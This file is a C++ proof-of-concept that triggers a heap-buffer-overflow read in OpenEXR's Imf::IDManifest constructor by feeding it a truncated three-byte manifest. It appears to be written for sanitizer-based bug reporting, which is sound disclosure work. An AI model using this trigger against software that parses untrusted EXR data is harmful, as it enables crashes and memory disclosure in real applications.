// PoC: heap-buffer-overflow read in Imf::IDManifest::init() version-field check.
//
// Imf::IDManifest(const char*, const char*) is a public, IMF_EXPORT,
// non-explicit constructor (ImfIDManifest.h) that parses an in-memory ID
// manifest blob (the payload of an EXR "idmanifest" attribute). It is
// reachable with no file I/O at all, directly from untrusted bytes.
#include <ImfIDManifest.h>

#include <cstdlib>
#include <cstring>
#include <new>

int
main (void)
{
    const size_t kSize = 3;
    char* data = new char[kSize];
    std::memset (data, 0, kSize);

    try
    {
        Imf::IDManifest manifest (data, data + kSize);
    }
    catch (...)
    {
        // A clean exception is the expected, in-contract outcome for a
        // truncated manifest; only a sanitizer-detected memory error is
        // of interest here.
    }

    delete[] data;
    return 0;
}
